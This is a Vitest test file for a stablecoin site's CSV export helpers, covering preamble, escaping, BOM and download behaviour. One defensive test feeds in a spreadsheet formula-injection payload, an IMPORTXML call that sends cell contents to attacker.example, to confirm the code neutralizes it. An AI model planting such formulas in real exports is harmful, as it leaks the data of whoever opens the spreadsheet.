// @vitest-environment jsdom

import { describe, expect, it, vi } from "vitest";
import { buildCsvWithPreamble, downloadCsvWithPreamble } from "@/lib/exports/csv";
import { PREAMBLE, expectBlob, useDownloadHarness } from "./exports.test-support";

describe("buildCsvWithPreamble", () => {
  it("prepends the `#` preamble, then header, then escaped rows", () => {
    const csv = buildCsvWithPreamble(
      [{ name: "USD Coin", note: "quoted, value" }],
      [
        { header: "Name", accessor: (row) => row.name },
        { header: "Note", accessor: (row) => row.note },
      ],
      PREAMBLE,
    );

    expect(csv).toBe(
      [
        "# Pharos pharos.watch | Endpoint: stablecoins | As of: 2026-05-16T12:00:00.000Z | URL: https://pharos.watch/ | Methodology: safety-score v7.25",
        "Name,Note",
        'USD Coin,"quoted, value"',
      ].join("\n"),
    );
  });

  it("renders null and undefined accessor values as empty cells", () => {
    const csv = buildCsvWithPreamble(
      [{ a: null as string | null, b: undefined as string | undefined }],
      [
        { header: "A", accessor: (row) => row.a },
        { header: "B", accessor: (row) => (row.b == null ? null : row.b) },
      ],
      PREAMBLE,
    );

    const lines = csv.split("\n");
    expect(lines[2]).toBe(",");
  });

  it("neutralizes formula-leading spreadsheet cells before CSV quoting", () => {
    const csv = buildCsvWithPreamble(
      [
        {
          symbol: '=IMPORTXML("https://attacker.example/?q="&A1)',
          mechanism: "+SUM(1,1)",
          spaced: "  @malicious",
          carriageReturn: "\r=malicious",
          ordinaryNegativeNumber: -1,
        },
      ],
      [
        { header: "Symbol", accessor: (row) => row.symbol },
        { header: "Mechanism", accessor: (row) => row.mechanism },
        { header: "Spaced", accessor: (row) => row.spaced },
        { header: "CarriageReturn", accessor: (row) => row.carriageReturn },
        { header: "OrdinaryNegativeNumber", accessor: (row) => row.ordinaryNegativeNumber },
      ],
      PREAMBLE,
    );

    expect(csv.split("\n")[2]).toBe(
      [
        '"\'=IMPORTXML(""https://attacker.example/?q=""&A1)"',
        '"\'+SUM(1,1)"',
        "'  @malicious",
        '"\'\r=malicious"',
        "-1",
      ].join(","),
    );
  });
});

describe("downloadCsvWithPreamble", () => {
  const harness = useDownloadHarness("blob:pharos-csv");
  const { createObjectURL, revokeObjectURL } = harness;

  it("creates a BOM-prefixed CSV blob, dated filename, and defers revoke", async () => {
    downloadCsvWithPreamble(
      [{ name: "USDC" }],
      [{ header: "Name", accessor: (row) => row.name }],
      "stablecoins",
      PREAMBLE,
    );

    expect(createObjectURL).toHaveBeenCalledTimes(1);
    const blob = createObjectURL.mock.calls[0]?.[0];
    expectBlob(blob);
    expect(blob.type).toBe("text/csv;charset=utf-8;");
    const bytes = new Uint8Array(await blob.arrayBuffer());
    expect(Array.from(bytes.slice(0, 3))).toEqual([239, 187, 191]); // UTF-8 BOM
    expect(harness.clickSpy).toHaveBeenCalledTimes(1);
    const anchor = harness.clickSpy.mock.instances[0] as HTMLAnchorElement | undefined;
    expect(anchor?.download).toBe("stablecoins-2026-05-16.csv");
    expect(revokeObjectURL).not.toHaveBeenCalled();

    await vi.runOnlyPendingTimersAsync();

    expect(revokeObjectURL).toHaveBeenCalledWith("blob:pharos-csv");
  });

  it("still revokes the object URL when the anchor click throws", async () => {
    harness.clickSpy.mockImplementation(() => {
      throw new Error("click blocked by browser policy");
    });

    expect(() =>
      downloadCsvWithPreamble(
        [{ name: "USDC" }],
        [{ header: "Name", accessor: (row) => row.name }],
        "stablecoins",
        PREAMBLE,
      ),
    ).toThrow("click blocked by browser policy");

    await vi.runOnlyPendingTimersAsync();

    expect(revokeObjectURL).toHaveBeenCalledWith("blob:pharos-csv");
  });
});
